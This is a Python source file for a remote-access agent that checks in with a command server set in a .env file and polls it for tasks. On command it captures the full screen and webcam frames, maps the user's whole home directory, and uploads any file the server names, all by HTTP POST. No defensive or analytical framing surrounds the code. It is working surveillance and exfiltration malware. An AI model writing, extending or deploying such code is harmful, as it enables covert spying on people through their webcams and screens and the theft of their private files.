
from dotenv import load_dotenv
import os
import requests
import time
import socket
import platform
import mss
import mss.tools
import cv2


class Agent():
    
    def __init__(self): # loads up settings from .env
        
        load_dotenv()
        
        try:
            self.pointurl = os.getenv("URL")
            if self.pointurl!=None: print(f"[+] URL LOADED {self.pointurl}")
            else: raise ValueError("Error in pointurl setup")
            
            self.id = os.getenv("AGENT_ID")
            if self.id!=None: print(f"[+] ID LOADED: {self.id}")
            else: raise ValueError("Error in agentID setup")
            
            self.heartbeat = int(os.getenv("HEARTBEAT"))
            if self.heartbeat!=None: print(f"[+] HEARTBEAT LOADED: {self.heartbeat}")
            else: raise ValueError("Error in heartbeat setup")
            
            print("[OK] Setup completed")
        
        except ValueError as e:
            print(f"[-] FATAL ERROR: {e}")
    
    
    def get_screen(self):
        with mss.MSS() as sct:
            shot = sct.grab(sct.monitors[0])
            png_bytes = mss.tools.to_png(shot.rgb, shot.size)
        requests.post(
            self.pointurl + "/screen",
            files={"file": ("screen.png", png_bytes, "image/png")},
            data={"id": self.id}
        )

    def get_webcam(self):
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        cam.release()
        if not ret:
            print("[-] Webcam not available")
            return
        _, buf = cv2.imencode(".png", frame)
        requests.post(
            self.pointurl + "/webcam",
            files={"file": ("webcam.png", buf.tobytes(), "image/png")},
            data={"id": self.id}
        )

    def get_files(self):
        root_path = os.path.expanduser("~")
        tree = self._build_tree(root_path)
        try:
            requests.post(
                self.pointurl + "/files",
                json={"id": self.id, "tree": tree},
                timeout=60
            )
        except Exception as e:
            print(f"[-] Failed to send file tree: {e}")

    def _build_tree(self, path):
        name = os.path.basename(path) or path
        node = {"name": name, "path": path, "type": "dir", "children": []}
        try:
            entries = sorted(
                os.scandir(path),
                key=lambda e: (not e.is_dir(follow_symlinks=False), e.name.lower())
            )
            for entry in entries:
                if entry.is_dir(follow_symlinks=False):
                    node["children"].append(self._build_tree(entry.path))
                else:
                    try:
                        size = entry.stat().st_size
                    except OSError:
                        size = 0
                    node["children"].append({
                        "name": entry.name,
                        "path": entry.path,
                        "type": "file",
                        "size": size
                    })
        except (PermissionError, OSError):
            pass
        return node

    def download_file(self, path):
        try:
            with open(path, "rb") as f:
                data = f.read()
            requests.post(
                self.pointurl + "/download",
                files={"file": (os.path.basename(path), data, "application/octet-stream")},
                data={"id": self.id},
                timeout=60
            )
        except Exception as e:
            print(f"[-] Download failed: {e}")

    
me = Agent()
       
    
def handle_task(tsk):
    pass
 
def connect(url):
    agent_id = me.id
    name = socket.gethostname()
    os_name = platform.system()

    while True:
        try:
            res = requests.post(
                url + "/info",
                json={
                    "id": agent_id,
                    "os": os_name,
                    "name": name
                },
                timeout=5
            )

            if res.status_code == 200:
                print("[+] Connected to server")
                return True

            print(f"[-] Server returned status: {res.status_code}")

        except requests.exceptions.ConnectionError:
            print("[-] Cannot connect to server")

        except requests.exceptions.Timeout:
            print("[-] Server timeout")

        time.sleep(3)







def task_check(url):
    try:
        res = requests.post(url+"/tasks", json={"id" : me.id}, timeout=5)
        data = res.json()
        task = data.get("task")
        if task == "NONE": return False
        elif task == "FILES": me.get_files()
        elif task.startswith("DOWNLOAD:"): me.download_file(task[len("DOWNLOAD:"):])
        elif task == "WEBCAM": me.get_webcam()
        elif task == "SCREEN": me.get_screen()
        elif task == "WHO": connect(url)
        
    except requests.exceptions.ConnectionError:
        print("[-] Cannot connect to server")
        return False

    except requests.exceptions.Timeout:
        print("[-] Server timeout")
        return False

    except Exception as e:
        print(f"[-] Task check failed: {e}")
        return False
    
    
    
        
def active_loop(pointurl, agentID, heartbeat):
    connect(pointurl)
    
    while True:
        task_check(pointurl)
        time.sleep(heartbeat)
    


active_loop(me.pointurl, me.id, me.heartbeat)